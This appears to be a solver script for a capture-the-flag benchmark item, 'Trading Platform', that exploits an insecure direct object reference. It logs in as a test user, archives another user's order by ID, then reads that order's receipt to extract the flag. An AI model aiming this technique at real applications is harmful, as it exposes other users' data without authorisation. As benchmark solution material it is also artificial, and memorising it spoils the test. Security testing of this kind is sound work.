#!/usr/bin/env bash
# XBEN-002-24 — "Trading Platform" (tags: idor). Proxy-mode twin. A receipt is
# only readable after the order is archived, but neither step checks ownership:
# archive someone else's order, then read its receipt — the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
ORDER="${2:-300198}"
SESSION="xben002p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set "path=/order/$ORDER/archive" >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set "path=/order/$ORDER/receipt" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
